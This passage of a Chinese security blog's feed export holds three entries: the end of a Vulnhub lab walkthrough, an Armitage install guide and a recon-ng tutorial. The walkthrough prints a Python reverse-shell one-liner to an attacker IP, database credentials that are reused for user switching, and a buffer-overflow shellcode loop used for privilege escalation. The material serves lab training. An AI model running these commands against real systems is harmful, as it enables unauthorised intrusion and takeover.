class="line">[06:07:14] 200 -  944B  - /docs/                                           </span><br><span class="line">[06:07:14] 403 -  280B  - /icons/                                          </span><br><span class="line">[06:07:15] 200 -   13B  - /header.php                                      </span><br><span class="line">[06:07:16] 301 -  318B  - /admin  -&gt;  http://192.168.159.145/admin/        </span><br><span class="line">[06:07:17] 302 -    0B  - /admin/  -&gt;  ../index.php                        </span><br><span class="line">[06:07:18] 500 -  614B  - /footer.php                                      </span><br><span class="line">[06:07:23] 301 -  320B  - /license  -&gt;  http://192.168.159.145/license/    </span><br><span class="line">[06:07:23] 200 -   39B  - /license/                                        </span><br><span class="line">[06:07:27] 200 -  975B  - /README.txt                                      </span><br><span class="line">[06:07:27] 200 -  931B  - /js/                                             </span><br><span class="line">[06:07:27] 301 -  315B  - /js  -&gt;  http://192.168.159.145/js/              </span><br><span class="line">[06:07:30] 301 -  320B  - /include  -&gt;  http://192.168.159.145/include/    </span><br><span class="line">[06:07:30] 200 -    2KB - /include/                                        </span><br><span class="line">[06:07:39] 301 -  319B  - /backup  -&gt;  http://192.168.159.145/backup/      </span><br><span class="line">[06:07:39] 200 -  744B  - /backup/                                         </span><br><span class="line">[06:07:41] 200 -    1KB - /styles/                                          </span><br><span class="line">[06:07:41] 301 -  319B  - /styles  -&gt;  http://192.168.159.145/styles/       </span><br><span class="line">[06:07:55] 200 -    1KB - /INSTALL.txt                                      </span><br><span class="line">[06:23:34] 200 -    2KB - /wysiwyg/                                           </span><br><span class="line">[06:23:34] 301 -  320B  - /wysiwyg  -&gt;  http://192.168.159.145/wysiwyg/       </span><br><span class="line">[06:42:02] 403 -  280B  - /server-status                                      </span><br><span class="line">[06:42:02] 403 -  280B  - /server-status/                                     </span><br><span class="line">[06:49:01] 301 -  318B  - /mails  -&gt;  http://192.168.159.145/mails/           </span><br><span class="line">[06:49:01] 200 -  964B  - /mails/ </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403312012755.png" /></p>
<p>尝试 RCE</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 33070.py http://192.168.159.145/index.php</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403312013920.png" /></p>
<p>成功！</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.159.152&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403312014101.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403312014103.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<p>找到个数据配置文件 base.inc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                        <span class="comment">// DATABASE CONNECTION INFORMATION</span></span><br><span class="line">                        <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DATABASE_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);           <span class="comment">// Database host</span></span><br><span class="line">                        <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DATABASE_NAME&#x27;</span>, <span class="string">&#x27;microblog&#x27;</span>);           <span class="comment">// Name of the database to be used</span></span><br><span class="line">                        <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DATABASE_USERNAME&#x27;</span>, <span class="string">&#x27;clapton&#x27;</span>); <span class="comment">// User name for access to database</span></span><br><span class="line">                        <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DATABASE_PASSWORD&#x27;</span>, <span class="string">&#x27;yaraklitepe&#x27;</span>);     <span class="comment">// Password for access to database</span></span><br><span class="line">                        <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_ENCRYPT_KEY&#x27;</span>, <span class="string">&#x27;p52plaiqb8&#x27;</span>);         <span class="comment">// Database encryption key</span></span><br><span class="line">                        <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_PREFIX&#x27;</span>, <span class="string">&#x27;mb101_&#x27;</span>);              <span class="comment">// Unique prefix of all table names in the database</span></span><br><span class="line">                        <span class="meta">?&gt;</span>www-data@debian:/<span class="keyword">var</span>/www/html/<span class="keyword">include</span>$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试直接切换到 clapton/yaraklitepe 用户</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403312017250.png" /></p>
<p>读到第一个 flag</p>
<p>有个 note.txt</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403312126850.png" /></p>
<p>提示利用缓冲区溢出来提权</p>
<blockquote>
<p><a
href="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow4.html">A
step-by-step on the computer buffer overflow vulnerability tutorials on
Intel x86 processor and C standard function call</a><br />
<a href="https://samsclass.info/127/proj/lbuf1.htm">Linux Buffer
Overflow</a><br />
<a
href="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html">The
vulnerable and the exploit program examples using C programming language
based on the SUID/GUID programs on Linux opensource machine with Intel
microprocessor</a></p>
</blockquote>
<p>没怎么理解缓冲区溢出提权原理【汇编】……具体操作可参见【<a
href="https://www.cnblogs.com/sainet/p/15789449.html#%E4%B8%89%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83">Vulnhub
靶场 DRIFTINGBLUES: 9 (FINAL) - sainet - 博客园</a>】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403312219055.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..10000&#125;; <span class="keyword">do</span> (./input $(python -c <span class="string">&#x27;print(&quot;A&quot; * 171 + &quot;\x40\x7f\xe9\xbf&quot; + &quot;\x90&quot;* 1000 + &quot;\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80&quot;)&#x27;</span>)); <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403312217584.png" /></p>
<p>拿到 flag!</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>反弹 shell</tag>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux 安装使用 Armitage</title>
    <url>/2021/10/09/Kali%20Linux%20%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%20Armitage/</url>
    <content><![CDATA[<h2 id="安装">1. 安装</h2>
<h3 id="方法1">1、方法1</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install armitage  <span class="comment">#root权限下</span></span><br></pre></td></tr></table></figure>
<h3 id="方法2">2、方法2</h3>
<ul>
<li><strong>Armitage下载地址</strong> ：<a
href="http://www.fastandeasyhacking.com/download/"
class="uri">http://www.fastandeasyhacking.com/download/</a></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211009103847251-480292006.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xf armitage150813.tgz  <span class="comment">#解压  </span></span><br><span class="line"><span class="built_in">cp</span> -r armitage /usr/share</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>添加环境变量</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># vim /etc/profile      </span></span><br></pre></td></tr></table></figure>
<p>将export PATH=$PATH:/usr/share/armitage/添加到profile最后即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># source /etc/profile</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>新建桌面图标</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /usr/share/applications/Armitage.desktop</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Armitage.desktop中添加以下内容</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Name=Armitage</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Exec=sh -c <span class="string">&quot;java -XX:+AggressiveHeap -XX:+UseParallelGC -jar /usr/share/armitage/armitage.jar <span class="variable">$@</span>&quot;</span></span><br><span class="line">Icon=kali-armitage</span><br><span class="line">StartupNotify=<span class="literal">false</span></span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>效果图</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211009120231102-1701356594.png" /></p>
<h2 id="启动注意点">2. 启动注意点</h2>
<ul>
<li><strong>必须使用一个 root用户权限进行工作。</strong></li>
<li><strong>如果在 Kali
Linux环境下工作，必须先启动PostgreSQL数据库服务和Metasploit服务。可以通过如下的命令完成。</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Kali Linux 1.0系列  </span></span><br><span class="line">root@kali~:<span class="comment">#service postgresql start</span></span><br><span class="line">root@kali~:<span class="comment">#service metasploit start  </span></span><br><span class="line"><span class="comment">#Kali Linux 2.0系列  </span></span><br><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>正常启动如下图</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211009142821772-924098945.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211009142848939-1607349148.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211009142927755-2054721841.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211009143103904-754955969.png" /></p>
<h2 id="使用教程">3. 使用教程</h2>
<p><strong>教程：</strong><a
href="http://www.fastandeasyhacking.com/manual#linux"
class="uri">http://www.fastandeasyhacking.com/manual#linux</a></p>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Armitage</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali 中 recon-ng 的简单使用</title>
    <url>/2021/11/17/Kali%20%E4%B8%AD%20recon-ng%20%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="recon-ng简介"><strong>1. recon-ng简介</strong></h2>
<ul>
<li><strong>Web 信息搜索框架</strong></li>
<li><strong>命令格式与 msf 一致</strong></li>
<li><strong>基于 python开发</strong></li>
<li><strong>使用方法：模块，数据库，报告</strong></li>
</ul>
<h2 id="简用教程">2. 简用教程</h2>
<h3 id="recon-ng-帮助命令"><strong>1、recon-ng 帮助命令</strong></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># recon-ng -h</span></span><br><span class="line">usage: recon-ng [-h] [-w workspace] [-r filename] [--no-version]</span><br><span class="line">                [--no-analytics] [--no-marketplace] [--stealth] [--version]</span><br><span class="line">                [--analytics]</span><br><span class="line"></span><br><span class="line">recon-ng - Tim Tomes (@lanmaster53)</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>        show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -w workspace      load/create a workspace</span><br><span class="line">  -r filename       load commands from a resource file</span><br><span class="line">  --no-version      <span class="built_in">disable</span> version check. Already disabled by default <span class="keyword">in</span></span><br><span class="line">                    Debian</span><br><span class="line">  --no-analytics    <span class="built_in">disable</span> analytics reporting. Already disabled by default</span><br><span class="line">                    <span class="keyword">in</span> Debian</span><br><span class="line">  --no-marketplace  <span class="built_in">disable</span> remote module management</span><br><span class="line">  --stealth         <span class="built_in">disable</span> all passive requests (--no-*)</span><br><span class="line">  --version         displays the current version</span><br><span class="line">  --analytics       <span class="built_in">enable</span> analytics reporting. Send analytics to google</span><br></pre></td></tr></table></figure>
<h3 id="创建一个test工作区如下">2、创建一个test工作区，如下</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># recon-ng -w test</span></span><br><span class="line">[!] Unable to synchronize module index. (ConnectionError).</span><br><span class="line">[*] Version check disabled.</span><br><span class="line"></span><br><span class="line">    _/_/_/    _/_/_/_/    _/_/_/    _/_/_/    _/      _/            _/      _/    _/_/_/</span><br><span class="line">   _/    _/  _/        _/        _/      _/  _/_/    _/            _/_/    _/  _/       </span><br><span class="line">  _/_/_/    _/_/_/    _/        _/      _/  _/  _/  _/  _/_/_/_/  _/  _/  _/  _/  _/_/_/</span><br><span class="line"> _/    _/  _/        _/        _/      _/  _/    _/_/            _/    _/_/  _/      _/ </span><br><span class="line">_/    _/  _/_/_/_/    _/_/_/    _/_/_/    _/      _/            _/      _/    _/_/_/    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                          /\</span><br><span class="line">                                         / \\ /\</span><br><span class="line">    Sponsored by...               /\  /\/  \\V  \/\</span><br><span class="line">                                 / \\/ // \\\\\ \\ \/\</span><br><span class="line">                                // // BLACK HILLS \/ \\</span><br><span class="line">                               www.blackhillsinfosec.com</span><br><span class="line"></span><br><span class="line">                  ____   ____   ____   ____ _____ _  ____   ____  ____</span><br><span class="line">                 |____] | ___/ |____| |       |   | |____  |____ |</span><br><span class="line">                 |      |   \_ |    | |____   |   |  ____| |____ |____</span><br><span class="line">                                   www.practisec.com</span><br><span class="line"></span><br><span class="line">                      [recon-ng v5.0.0, Tim Tomes (@lanmaster53)]                       </span><br><span class="line"></span><br><span class="line">[*] No modules enabled/installed.</span><br><span class="line"></span><br><span class="line">[recon-ng][<span class="built_in">test</span>] &gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>备注：红色报错是recon-ng更新导致的（新版本模块需要自己手动安装），暂时忽略，后面解决</strong></li>
</ul>
<h3 id="模块安装解决上述报错">3、模块安装（解决上述报错）</h3>
<p><strong>（1）单个模块的安装，以brute_hosts为例</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[recon-ng][default] &gt;marketplace refresh</span><br><span class="line">[*] Marketplace index refreshed.   </span><br><span class="line">[recon-ng][default] &gt;marketplace search brute_hosts</span><br><span class="line">[*] Searching module index <span class="keyword">for</span> <span class="string">&#x27;brute_hosts&#x27;</span>...</span><br><span class="line"></span><br><span class="line">  +--------------------------------------------------------------------------------+</span><br><span class="line">  |               Path              | Version |     Status    |  Updated   | D | K |</span><br><span class="line">  +--------------------------------------------------------------------------------+</span><br><span class="line">  | recon/domains-hosts/brute_hosts | 1.0     | not installed | 2019-06-24 |   |   |</span><br><span class="line">  +--------------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">  D = Has dependencies. See info <span class="keyword">for</span> details.</span><br><span class="line">  K = Requires keys. See info <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">[recon-ng][default] &gt; marketplace install recon/domains-hosts/brute_hosts</span><br><span class="line">[*] Module installed: recon/domains-hosts/brute_hosts</span><br><span class="line">[*] Reloading modules...</span><br><span class="line">[recon-ng][default] &gt; modules </span><br><span class="line">load    reload  search  </span><br><span class="line">[recon-ng][default] &gt; modules reload</span><br><span class="line">[*] Reloading modules...</span><br><span class="line">[recon-ng][default] &gt;modules search brute</span><br><span class="line">[*] Searching installed modules <span class="keyword">for</span> <span class="string">&#x27;brute&#x27;</span>...</span><br><span class="line"></span><br><span class="line">  Recon</span><br><span class="line">  -----</span><br><span class="line">    recon/domains-hosts/brute_hosts</span><br><span class="line"></span><br><span class="line">[recon-ng][default] &gt; use recon/domains-hosts/brute_hosts</span><br><span class="line">[!] Invalid <span class="built_in">command</span>: use recon/domains-hosts/brute_hosts.</span><br><span class="line">[recon-ng][default] &gt; modules load recon/domains-hosts/brute_hosts</span><br><span class="line">[recon-ng][default][brute_hosts] &gt;options list</span><br><span class="line">Name Current Value Required Description</span><br><span class="line">-------- ------------- -------- -----------</span><br><span class="line">SOURCE default <span class="built_in">yes</span> <span class="built_in">source</span> of input (see <span class="string">&#x27;show info&#x27;</span> <span class="keyword">for</span> details)</span><br><span class="line">WORDLIST /root/.recon-ng/data/hostnames.txt <span class="built_in">yes</span> path to hostname wordlist</span><br><span class="line"></span><br><span class="line">[recon-ng][default][brute_hosts] &gt;options </span><br><span class="line">list   <span class="built_in">set</span>    <span class="built_in">unset</span>  </span><br><span class="line">[recon-ng][default][brute_hosts] &gt;options <span class="built_in">set</span> SOURCE ？？？.com</span><br><span class="line">SOURCE =&gt; ？？？.com</span><br><span class="line">[recon-ng][default][brute_hosts] &gt; run</span><br><span class="line"></span><br><span class="line">---------</span><br><span class="line">BAIDU.COM</span><br><span class="line">---------</span><br><span class="line">[*] No Wildcard DNS entry found.</span><br><span class="line">[*] 1. ？？？.com =&gt; No record found.</span><br><span class="line"></span><br><span class="line">… ……………</span><br><span class="line"></span><br><span class="line">[*] b2c. ？？？.com =&gt; No record found.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------</span><br><span class="line">SUMMARY</span><br><span class="line">------- [ *] 85 total (80 new) hosts found.</span><br><span class="line">[recon-ng][default][brute_hosts] &gt;show</span><br><span class="line">companies        domains          locations        profiles         vulnerabilities</span><br><span class="line">contacts         hosts            netblocks        pushpins         </span><br><span class="line">credentials      leaks            ports            repositories     </span><br><span class="line">[recon-ng][default][brute_hosts] &gt; show hosts</span><br><span class="line"></span><br><span class="line">  +----------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">  | rowid |                host                |    ip_address   | region | country | latitude | longitude |    module   |</span><br><span class="line">  +----------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">  | 1     | wwwyq.n. ？？？.com                 |                 |        |         |          |           | brute_hosts |</span><br><span class="line">  … ……………</span><br><span class="line">  | 80    | b2b. ？？？.com                      | xxx.xxx.212.101 |        |         |          |           | brute_hosts |</span><br><span class="line">  +----------------------------------------------------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">[*] 80 rows returned</span><br><span class="line">[recon-ng][default][brute_hosts] &gt; </span><br></pre></td></tr></table></figure>
<ul>
<li>为避免给自己带来不必要的麻烦，部分信息使用"???"和"xxx"做了替换！</li>
</ul>
<p><strong>（2）安装所有模块</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[recon-ng][default] &gt;marketplace refresh</span><br><span class="line">[*] Marketplace index refreshed.</span><br><span class="line">[recon-ng][default] &gt; marketplace installall</span><br><span class="line">[*] Module installed: discovery/info_disclosure/cache_snoop</span><br><span class="line">[*] Module installed: discovery/info_disclosure/interesting_files</span><br><span class="line">[*] Module installed: exploitation/injection/command_injector</span><br><span class="line">[*] Module installed: exploitation/injection/xpath_bruter</span><br><span class="line">[*] Module installed: import/csv_file</span><br><span class="line">[*] Module installed: import/list</span><br><span class="line">[*] Module installed: import/masscan</span><br><span class="line">[*] Module installed: import/nmap</span><br><span class="line"></span><br><span class="line">…………</span><br><span class="line"></span><br><span class="line">[*] Module installed: reporting/proxifier</span><br><span class="line">[*] Module installed: reporting/pushpin</span><br><span class="line">[*] Module installed: reporting/xlsx</span><br><span class="line">[*] Module installed: reporting/xml</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<p>marketplace refresh
该指令输入后应该会报错，解决方法如下(参考自：https://www.hacksafe.net/tool/hacktool/4135.html)</p>
<p>（1）配置本地DNS服务器信息（即不使用本地DNS）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nameserver 114.114.114.114</span><br><span class="line">nameserver 8.8.4.4</span><br></pre></td></tr></table></figure>
<p>（2）将动态IP转换为静态IP</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static <span class="comment"># static IP</span></span><br><span class="line">address <span class="comment">#本机IP</span></span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway <span class="comment">#网关</span></span><br></pre></td></tr></table></figure>
<h3 id="使用-help-查看帮助信息"><strong>4、使用 help
查看帮助信息</strong></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[recon-ng][<span class="built_in">test</span>] &gt;<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Commands (<span class="built_in">type</span> [<span class="built_in">help</span>|?] &lt;topic&gt;):</span><br><span class="line">---------------------------------</span><br><span class="line">back            Exits the current context</span><br><span class="line">dashboard       Displays a summary of activity</span><br><span class="line">db              Interfaces with the workspace<span class="string">&#x27;s database</span></span><br><span class="line"><span class="string">exit            Exits the framework</span></span><br><span class="line"><span class="string">help            Displays this menu</span></span><br><span class="line"><span class="string">index           Creates a module index (dev only)</span></span><br><span class="line"><span class="string">keys            Manages third party resource credentials</span></span><br><span class="line"><span class="string">marketplace     Interfaces with the module marketplace</span></span><br><span class="line"><span class="string">modules         Interfaces with installed modules</span></span><br><span class="line"><span class="string">options         Manages the current context options</span></span><br><span class="line"><span class="string">pdb             Starts a Python Debugger session (dev only)</span></span><br><span class="line"><span class="string">script          Records and executes command scripts</span></span><br><span class="line"><span class="string">shell           Executes shell commands</span></span><br><span class="line"><span class="string">show            Shows various framework items</span></span><br><span class="line"><span class="string">snapshots       Manages workspace snapshots</span></span><br><span class="line"><span class="string">spool           Spools output to a file</span></span><br><span class="line"><span class="string">workspaces      Manages workspaces</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[recon-ng][test] &gt; </span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>对于一个命令不知道有什么参数时，可先输入命令然后双击Tab查看可用参数/指令，如下</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[recon-ng][default] &gt; marketplace </span><br><span class="line">    info     install  refresh  remove   search  <span class="comment">#可用指令</span></span><br></pre></td></tr></table></figure>
<p><strong>（1）keys命令</strong></p>
<p>当想要在终端使用谷歌，bing，shodan，twitter等查询信息时，可通过keys添加相应的API即可，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[recon-ng][<span class="built_in">test</span>] &gt; keys </span><br><span class="line">add     list    remove  </span><br><span class="line">[recon-ng][<span class="built_in">test</span>] &gt; keys list</span><br><span class="line"></span><br><span class="line">  +--------------------------+</span><br><span class="line">  |       Name       | Value |</span><br><span class="line">  +--------------------------+</span><br><span class="line">  | binaryedge_api   |       |</span><br><span class="line">  | bing_api         |       |</span><br><span class="line">  | builtwith_api    |       |</span><br><span class="line">  | censysio_id      |       |</span><br><span class="line">  | censysio_secret  |       |</span><br><span class="line">  | flickr_api       |       |</span><br><span class="line">  | fullcontact_api  |       |</span><br><span class="line">  | github_api       |       |</span><br><span class="line">  | google_api       |       |</span><br><span class="line">  | hashes_api       |       |</span><br><span class="line">  | hibp_api         |       |</span><br><span class="line">  | hunter_io        |       |</span><br><span class="line">  | ipinfodb_api     |       |</span><br><span class="line">  | ipstack_api      |       |</span><br><span class="line">  | namechk_api      |       |</span><br><span class="line">  | pwnedlist_api    |       |</span><br><span class="line">  | pwnedlist_secret |       |</span><br><span class="line">  | spyse_api        |       |</span><br><span class="line">  | twitter_api      |       |</span><br><span class="line">  | twitter_secret   |       |</span><br><span class="line">  | virustotal_api   |       |</span><br><span class="line">  | whoxy_api        |       |</span><br><span class="line">  +--------------------------+ [recon -ng][<span class="built_in">test</span>] &gt;keys add bing_api 111w1w1w1w1w1w12w1sjjkas**</span><br><span class="line">[*] Key <span class="string">&#x27;bing_api&#x27;</span> added.</span><br><span class="line">[recon-ng][<span class="built_in">test</span>] &gt; keys list </span><br><span class="line"></span><br><span class="line">  +---------------------------------------------+</span><br><span class="line">  |       Name       |          Value           |</span><br><span class="line">  +---------------------------------------------+</span><br><span class="line">  | binaryedge_api   |                          |</span><br><span class="line">  | bing_api         | 111w1w1w1w1w1w12w1sjjkas |</span><br><span class="line">  | builtwith_api    |                          |</span><br><span class="line">  | censysio_id      |                          |</span><br><span class="line">  | censysio_secret  |                          |</span><br><span class="line">  | flickr_api       |                          |</span><br><span class="line">  | fullcontact_api  |                          |</span><br><span class="line">  | github_api       |                          |</span><br><span class="line">  | google_api       |                          |</span><br><span class="line">  | hashes_api       |                          |</span><br><span class="line">  | hibp_api         |                          |</span><br><span class="line">  | hunter_io        |                          |</span><br><span class="line">  | ipinfodb_api     |                          |</span><br><span class="line">  | ipstack_api      |                          |</span><br><span class="line">  | namechk_api      |                          |</span><br><span class="line">  | pwnedlist_api    |                          |</span><br><span class="line">  | pwnedlist_secret |                          |</span><br><span class="line">  | spyse_api        |                          |</span><br><span class="line">  | twitter_api      |                          |</span><br><span class="line">  | twitter_secret   |                          |</span><br><span class="line">  | virustotal_api   |                          |</span><br><span class="line">  | whoxy_api        |                          |</span><br><span class="line">  +---------------------------------------------+</span><br></pre></td></tr></table></figure>
<ul>
<li>remove同理，移除某一API</li>
</ul>
<p><strong>（2）shell 命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[recon-ng][<span class="built_in">test</span>] &gt; shell <span class="built_in">ls</span></span><br><span class="line">[*] Command: <span class="built_in">ls</span></span><br><span class="line">recon</span><br><span class="line">recon-cli</span><br><span class="line">recon-ng</span><br><span class="line">recon-web</span><br><span class="line">VERSION</span><br><span class="line">[recon-ng][<span class="built_in">test</span>] &gt; shell <span class="built_in">pwd</span></span><br><span class="line">[*] Command: <span class="built_in">pwd</span></span><br><span class="line">/usr/share/recon-ng</span><br></pre></td></tr></table></figure>
<p><strong>（3） snapshots （快照）命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[recon-ng][<span class="built_in">test</span>] &gt;snapshots </span><br><span class="line">delete  list    load    take    </span><br><span class="line">[recon-ng][<span class="built_in">test</span>] &gt;snapshots take</span><br><span class="line">[*] Snapshot created: snapshot_20211117040109.db</span><br><span class="line">[recon-ng][<span class="built_in">test</span>] &gt;snapshots load snapshot_20211117040109.db</span><br><span class="line">[*] Snapshot loaded: snapshot_20211117040109.db</span><br><span class="line">[recon-ng][<span class="built_in">test</span>] &gt;snapshots delete snapshot_20211117040109.db</span><br><span class="line">[*] Snapshot removed: snapshot_20211117040109.db</span><br><span class="line">[recon-ng][<span class="built_in">test</span>] &gt; </span><br></pre></td></tr></table></figure>
<p><strong>（4）options 命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[recon-ng][<span class="built_in">test</span>] &gt;options </span><br><span class="line">list   <span class="built_in">set</span>    <span class="built_in">unset</span>  </span><br><span class="line">[recon-ng][<span class="built_in">test</span>] &gt;options list</span><br><span class="line"></span><br><span class="line">  Name        Current Value  Required  Description</span><br><span class="line">  ----------  -------------  --------  -----------</span><br><span class="line">  NAMESERVER  8.8.8.8        <span class="built_in">yes</span>       default nameserver <span class="keyword">for</span> the resolver mixin</span><br><span class="line">  PROXY                      no        proxy server (address:port)</span><br><span class="line">  THREADS     10             <span class="built_in">yes</span>       number of threads (<span class="built_in">where</span> applicable)</span><br><span class="line">  TIMEOUT     10             <span class="built_in">yes</span>       socket <span class="built_in">timeout</span> (seconds)</span><br><span class="line">  USER-AGENT  Recon-ng/v5    <span class="built_in">yes</span>       user-agent string</span><br><span class="line">  VERBOSITY   1              <span class="built_in">yes</span>       verbosity level (0 = minimal, 1 = verbose, 2 = debug)</span><br><span class="line"></span><br><span class="line">[recon-ng][<span class="built_in">test</span>] &gt; options <span class="built_in">set</span> PROXY 127.0.0.1:8889</span><br><span class="line">PROXY =&gt; 127.0.0.1:8889 [recon -ng][<span class="built_in">test</span>] &gt;options <span class="built_in">unset</span> NAMESERVER </span><br><span class="line">NAMESERVER =&gt; None</span><br><span class="line">[recon-ng][<span class="built_in">test</span>] &gt;options list</span><br><span class="line"></span><br><span class="line">  Name        Current Value   Required  Description</span><br><span class="line">  ----------  -------------   --------  -----------</span><br><span class="line">  NAMESERVER                  <span class="built_in">yes</span>       default nameserver <span class="keyword">for</span> the resolver mixin</span><br><span class="line">  PROXY       127.0.0.1:8889  no        proxy server (address:port)</span><br><span class="line">  THREADS     10              <span class="built_in">yes</span>       number of threads (<span class="built_in">where</span> applicable)</span><br><span class="line">  TIMEOUT     10              <span class="built_in">yes</span>       socket <span class="built_in">timeout</span> (seconds)</span><br><span class="line">  USER-AGENT  Recon-ng/v5     <span class="built_in">yes</span>       user-agent string</span><br><span class="line">  VERBOSITY   1               <span class="built_in">yes</span>       verbosity level (0 = minimal, 1 = verbose, 2 = debug)</span><br><span class="line"></span><br><span class="line">[recon-ng][<span class="built_in">test</span>] &gt; </span><br></pre></td></tr></table></figure>
